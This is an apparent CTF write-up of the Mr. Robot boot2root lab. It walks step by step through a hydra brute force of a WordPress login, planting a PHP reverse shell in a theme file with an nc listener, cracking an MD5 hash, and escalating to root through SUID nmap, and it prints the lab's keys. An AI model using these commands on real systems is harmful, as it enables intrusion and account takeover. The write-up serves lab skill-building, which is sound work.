# Mr. Robot CTF — Walkthrough

> A beginner/intermediate boot2root VM inspired by the *Mr. Robot* TV series. Goal: find 3 hidden keys and root the box.

**Category:** Web Exploitation → Password Cracking → Privilege Escalation
**Tools:** `nmap`, `gobuster`, `curl`, `hydra`, `john` / `hashcat`, GTFOBins (`nmap` privesc)
**Author:** Khalid Abdullahi ([@Khalid-devsec](https://github.com/Khalid-devsec))

---

## Target Overview

| Field | Value |
|---|---|
| Target IP | `10.82.169.249` (web) / `10.82.151.52` (post-shell) |
| Open Ports | 22 (SSH), 80 (HTTP), 443 (SSL/HTTP) |
| OS | Ubuntu Linux |

## 1. Reconnaissance

Started with a full service/version scan:

```bash
nmap -sV -A 10.82.169.249
```

![nmap scan](./images/01-nmap-scan.png)

Results:

```
22/tcp  open  ssh       OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp  open  http      Apache httpd
443/tcp open  ssl/http  Apache httpd
```

Only a web server of real interest — visiting port 80 dropped an in-character `fsociety` terminal easter egg with no useful commands.

![fsociety easter egg](./images/02-fsociety-easter-egg.png)

## 2. Directory & File Enumeration

Brute-forced content with **Gobuster**:

```bash
gobuster dir -u http://10.82.169.249 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![gobuster scan](./images/03-gobuster-scan.png)

Interesting hits: `/robots`, `/readme`, `/license`, `/wp-login.php`.

`/robots` revealed:

![robots.txt](./images/04-robots-txt.png)

```
User-agent: *
fsociety.dic
key-1-of-3.txt
```

**Key 1** was sitting right there at `/key-1-of-3.txt`:

![key 1](./images/05-key1.png)

```
073403c8a58a1f80d943455fb30724b9
```

`fsociety.dic` downloaded via `curl` turned out to be a huge (mostly duplicate) wordlist — later cleaned with:

```bash
sort fsocity.dic | uniq > wordlist
```

`/license` teased a hint before scrolling down to reveal a base64 string:

![license hint](./images/06-license-hint.png)

![license base64 string](./images/07-license-base64.png)

```
ZWxsaW90OkVSMjgtMDY1Mgo=
```

Ran it through a hash identifier first to confirm the encoding:

![hash identifier](./images/08-hash-identifier.png)

Decoded:

```bash
echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
```

![base64 decode](./images/09-base64-decode.png)

```
elliot:ER28-0652
```

## 3. Credential Validation via Hydra

`/login` redirected to a WordPress login (`/wp-login.php`).

![wp-login page](./images/10-wp-login.png)

Rather than trust the found creds outright, validated the **username** first — the login form leaks different errors for invalid username vs. invalid password:

![invalid username error](./images/11-invalid-username.png)

Inspected the form source to grab the POST parameter names (`log`, `pwd`):

![source inspect](./images/12-source-inspect.png)

```bash
hydra -L wordlist -P wordlist 10.82.169.249 http-post-form \
"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username." -V -f
```

![hydra username brute force](./images/13-hydra-username-brute.png)

→ confirmed `elliot` is a valid username.

With a valid username, the error message shifts to a password-specific one:

![invalid password error](./images/14-invalid-password.png)

Brute-forced the **password** against the cleaned wordlist:

```bash
hydra -l elliot -P fsociety.dic 10.82.169.249 http-post-form \
"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=The password you entered for the username elliot is incorrect." -V -f
```

![hydra password brute force](./images/15-hydra-password-brute.png)

→ confirmed `elliot:ER28-0652` (matching the base64 find).

## 4. Initial Foothold — WordPress Theme Editor RCE

Logged into `/wp-admin` as `elliot` — an administrator account with access to **Appearance → Editor**.

![wp-admin dashboard](./images/16-wp-admin-dashboard.png)

Abused the built-in PHP template editor: overwrote `404.php` (Twenty Fifteen theme) with a [pentestmonkey PHP reverse shell](http://pentestmonkey.net/tools/php-reverse-shell), pointed `$ip` at my attacking box, and saved.

![reverse shell editor](./images/17-reverse-shell-editor.png)

Started a listener:

```bash
nc -lnvp 8888
```

![nc listener](./images/18-nc-listener.png)

Triggered the payload by visiting:

```
http://10.82.151.52/wp-includes/themes/TwentyFifteen/404.php
```

![shell connect](./images/19-shell-connect.png)

→ shell as `daemon`.

## 5. Lateral Movement — Cracking `robot`'s Hash

Enumerated `/home`:

![home robot directory](./images/20-home-robot-dir.png)

```bash
cd /home/robot
ls
# key-2-of-3.txt   password.raw-md5
cat key-2-of-3.txt
# Permission denied (owned by robot)
cat password.raw-md5
# robot:c3fcd3d76192e4007dfb496cca67e13b
```

Cracked the MD5 with `john` (rockyou.txt):

```bash
john md5.hash --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt
```

![john crack](./images/21-john-crack.png)

→ `abcdefghijklmnopqrstuvwxyz`

*(equivalent one-liner with hashcat: `hashcat -a 0 -m 0 md5.hash /usr/share/wordlists/rockyou.txt`)*

Upgraded to a proper TTY (needed for `su`) and switched user:

```bash
python -c 'import pty; pty.spawn("/bin/bash");'
su robot
# Password: abcdefghijklmnopqrstuvwxyz
```

![su robot](./images/22-su-robot.png)

**Key 2**:

![key 2](./images/23-key2.png)

```
822c73956184f694993bede3eb39f959
```

## 6. Privilege Escalation — SUID `nmap`

Hunted for SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

![SUID find](./images/24-suid-find.png)

`/usr/local/bin/nmap` stood out — not a default SUID binary. Checked [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/), which documents an interactive-mode shell escape for legacy nmap versions (2.02–5.21):

```bash
nmap --interactive
nmap> !sh
```

![nmap interactive root shell](./images/25-nmap-interactive-root.png)

→ instant root shell.

**Key 3**:

![key 3](./images/26-key3.png)

```
04787ddef27c3dee1ee161b21670b4e4
```

## Summary

| Key | Value | How obtained |
|---|---|---|
| Key 1 | `073403c8a58a1f80d943455fb30724b9` | Directory enumeration → `robots.txt` disclosure |
| Key 2 | `822c73956184f694993bede3eb39f959` | Cracked `robot`'s MD5 hash → `su robot` |
| Key 3 | `04787ddef27c3dee1ee161b21670b4e4` | SUID `nmap` → GTFOBins interactive shell |

### Skills demonstrated
- Web recon & content discovery (`nmap`, `gobuster`)
- OSINT-style clue chaining (base64-encoded creds hidden in page source)
- Credential validation via differential error messages + `hydra`
- CMS (WordPress) admin-panel abuse → arbitrary PHP execution
- Offline hash cracking (`john`/`hashcat`)
- Linux privilege escalation via misconfigured SUID binaries (GTFOBins)

---
*Educational writeup — completed in an isolated lab environment for VAPT skill-building.*
